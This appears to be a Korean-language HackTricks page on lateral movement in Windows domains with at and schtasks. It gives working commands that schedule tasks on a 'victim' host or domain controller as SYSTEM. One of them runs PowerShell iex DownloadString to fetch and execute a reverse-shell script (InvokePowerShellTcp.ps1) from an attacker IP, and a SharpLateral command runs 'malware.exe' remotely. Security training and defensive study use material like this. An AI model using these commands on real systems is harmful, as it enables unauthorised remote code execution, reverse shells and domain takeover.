# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 원리

At는 사용자 이름/(비밀번호/해시)를 알고 있는 호스트에서 작업을 예약할 수 있게 해줍니다. 따라서 다른 호스트에서 명령을 실행하고 출력을 얻는 데 사용할 수 있습니다.
```
At \\victim 11:00:00PM shutdown -r
```
schtasks를 사용하여 먼저 작업을 생성한 다음 호출해야 합니다:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
당신은 또한 [SharpLateral](https://github.com/mertdas/SharpLateral)을 사용할 수 있습니다:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[**실버 티켓과 함께 schtasks 사용에 대한 더 많은 정보는 여기**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
